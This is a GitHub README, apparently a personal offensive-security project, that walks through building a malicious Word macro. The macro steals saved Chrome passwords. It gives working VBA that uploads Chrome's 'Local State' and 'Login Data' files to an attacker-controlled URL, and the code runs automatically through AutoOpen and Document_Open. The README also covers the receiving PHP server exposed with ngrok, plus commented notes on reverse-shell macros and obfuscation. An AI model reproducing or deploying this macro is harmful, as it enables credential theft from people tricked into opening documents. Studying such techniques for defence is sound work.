# The word is yours





<div align=center>
<img src=https://github.com/ariary/WordTrojan/blob/main/img/logo.png width=180>
<br><strong><i>Malicious macro for the dummies<sup>*</sup></i></strong>
<br><sup>* In fact it is for me</sup> 

  🔫 <strong>•</strong> 🥷 <strong>•</strong> 🫖
</div> 


## Context

It is well-known that macro is a great vector of attack to execute malicious code on victim device. The approach is basically to make the victim open an MS document which will run code using Macro.

Macro are written in VBA which is a precompiled language (⇒ easy to reverse.. argh).

We suppose the victim is using Windows.

### What we want to do?

To discover a bit the macro world. Our aim is to steal credentials stored in the Chrome password manager. The scenario is the following:
* Transfer malicious word document to victim *(out-of-scope: use social-engineering,phishing, ..)*
* Encourage them to open it + enable macro
  * The macro will retrieve the files containing credentials, then send them to C2 server
* On C2 server we will decrypt the credentials

## 🔫 Naive approach

- [Retrieve sensitive files and send it from word](#retrieve-sensitive-files-and-send-it-from-word)
- [Receive files on Attacker side](#receive-files-on-attacker-side)
- [Let's Contemplate the explosion](#lets-contemplate-the-explosion)
- [Caveat](#caveat)

> 💡 **Create Macro**: in your word document *View* > Macros > view macros > Edit

### Retrieve sensitive files and send it from word

The macro payload reads the differents files containing Chrome passwords and send them to C2 server. Translate it in VBA:
```VBA
Private Function pvPostFile(sUrl As String, sFileName As String, Optional ByVal bAsync As Boolean) As String
    Const STR_BOUNDARY  As String = "3fbd04f5-b1ed-4060-99b9-fca7ff59c113"
    Dim nFile           As Integer
    Dim baBuffer()      As Byte
    Dim sPostData       As String
 
    '--- read file
    nFile = FreeFile
    Open sFileName For Binary Access Read As nFile
    If LOF(nFile) > 0 Then
        ReDim baBuffer(0 To LOF(nFile) - 1) As Byte
        Get nFile, , baBuffer
        sPostData = StrConv(baBuffer, vbUnicode)
    End If
    Close nFile
    '--- prepare body
    sPostData = "--" & STR_BOUNDARY & vbCrLf & _
        "Content-Disposition: form-data; name=""uploadfile""; filename=""" & Mid$(sFileName, InStrRev(sFileName, "\") + 1) & """" & vbCrLf & _
        "Content-Type: application/octet-stream" & vbCrLf & vbCrLf & _
        sPostData & vbCrLf & _
        "--" & STR_BOUNDARY & "--"
    '--- post
    With CreateObject("Microsoft.XMLHTTP")
        .Open "POST", sUrl, bAsync
        .SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & STR_BOUNDARY
        .Send pvToByteArray(sPostData)
        If Not bAsync Then
            pvPostFile = .ResponseText
        End If
    End With
End Function
 
Private Function pvToByteArray(sText As String) As Byte()
    pvToByteArray = StrConv(sText, vbFromUnicode)
End Function
```
(from [wqweto](https://wqweto.wordpress.com/2011/07/12/vb6-using-wininet-to-post-binary-file/))

Now call this function to send the files we want:
```VBA
Private Sub Malware()
    pvPostFile "https://[ATTACKER_URL]/upload.php?id=[TARGET_ID]", "C:\Users\" & Environ("username") & "\AppData\Local\Google\Chrome\User Data\Local State"
    pvPostFile "https://[ATTACKER_URL]/upload.php?id=[TARGET_ID]", "C:\Users\" & Environ("username") & "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
End Sub

Private Sub Launch()
    Malware
End Sub

Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub
```
`Document_Open` and `AutoOpen` are special functions which are automatically executed when the word document is open.

### Receive files on Attacker side

[`php/upload.php`](https://github.com/ariary/TheWordIsYours/blob/main/php/upload.php) is the php file in charge of receiving uploaded file (with `multipart/form-data`).

Launch the server (from here) and expose it (with `ngrok`, for test purpose only):
```shell
php -S localhost:8080 -t php

#On another tab
ngrok http 8080
```
Let's copy your ngrok https endpoint and replace `[ATTACKER_URL]` in the macro

### Let's Contemplate the explosion

Now open the word document (on a windows machine please) and **bang**, see that it has discreetly exfiltrated the documents on your attacking machine.

Now that we have what we want, proceed to password decryption on attacker machine (which is the coolest part)

*.. to do*

### Caveat

* Our macro payload lets a lot of information through that will allow a blue team to trace you easily as well as defend themselves
* Target must enable macros to trigger the payload *(sometimes it is by default sometimes not, don't ask me)*

## 🥷 On the road to stealth
*.. to do*
### Encrypt payload
### Hide keys
### Enhance target to enable macros

<!--Example of revershell macro in word document

See https://vunnm.files.wordpress.com/2018/09/article_macro_reverse_shell.pdf

And https://www.thedecentshub.tech/2021/08/reverse-shell-from-word-documents.html

Obfuscation: https://connect.ed-diamond.com/MISC/misc-087/automatisation-d-une-obfuscation-de-code-vba-avec-vbad

For macro useful tool: https://github.com/CaledoniaProject/awesome-opensource-security/blob/master/office-tools.md
1. Create macro (reverseshell + social engineering)
2. Force victime to click on enable content
3. Get reverse shell

Faire aussi un payload qui récupère les mdp enregistrés par chrome ou Firefox -->
